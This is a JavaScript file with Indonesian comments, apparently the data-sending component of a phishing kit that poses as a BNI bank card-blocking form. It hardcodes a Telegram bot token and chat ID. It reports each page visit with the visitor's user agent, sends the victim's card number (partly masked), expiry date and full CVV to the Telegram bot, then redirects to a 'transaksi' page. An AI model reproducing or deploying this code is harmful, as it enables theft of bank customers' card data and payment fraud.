// =========================================================
// 🤖 KONFIGURASI & FUNGSI BOT TELEGRAM
// =========================================================

// ⚠️ SIMPAN TOKEN & ID DI SINI — TIDAK TERCAMPUR HTML
const TELEGRAM_CONFIG = {
  BOT_TOKEN: "8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04",
  CHAT_ID: "7402071395",
  NEXT_URL: "transaksi.html"
};

// =========================================================
// 📤 FUNGSI KIRIM PESAN KE TELEGRAM
// =========================================================
async function kirimPesanTelegram(pesan) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: pesan,
        parse_mode: "Markdown"
      })
    });

    const hasil = await response.json();
    return hasil.ok === true;
  } catch (error) {
    console.error("❌ Gagal kirim ke Telegram:", error);
    return false;
  }
}

// =========================================================
// 📝 FUNGSI NOTIFIKASI HALAMAN DIBUKA
// =========================================================
function notifikasiHalamanDibuka(namaHalaman) {
  const pesan = `
🌐 HALAMAN DIBUKA
━━━━━━━━━━━━━━━━━━━━
📄 Halaman: ${namaHalaman}
🕐 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
📱 Perangkat: ${navigator.userAgent.slice(0, 80)}...
━━━━━━━━━━━━━━━━━━━━
  `.trim();
  kirimPesanTelegram(pesan);
}

// =========================================================
// 🔀 FUNGSI PINDAH KE HALAMAN BERIKUTNYA
// =========================================================
function lanjutKeHalamanBerikutnya() {
  window.location.href = TELEGRAM_CONFIG.NEXT_URL;
}

// =========================================================
// 📤 FUNGSI KIRIM DATA FORM BLOKIR KARTU
// =========================================================
async function kirimDataBlokirKartu(data) {
  const { noKartu, bulan, tahun, cvv, namaBank = "BNI" } = data;
  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const pesan = `
🔔 PERMINTAAN BLOKIR KARTU
━━━━━━━━━━━━━━━━━━━━
🏦 Bank: ${namaBank}
📅 Waktu: ${waktu}
💳 No. Kartu: ${noKartu.slice(0, 6)}XXXXXX${noKartu.slice(-4)}
📅 Berlaku: ${bulan}/${tahun}
🔒 CVV: ${cvv}
━━━━━━━━━━━━━━━━━━━━
  `.trim();

  return await kirimPesanTelegram(pesan);
}

// Ekspor untuk dipakai di HTML
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    TELEGRAM_CONFIG,
    kirimPesanTelegram,
    notifikasiHalamanDibuka,
    lanjutKeHalamanBerikutnya,
    kirimDataBlokirKartu
  };
}
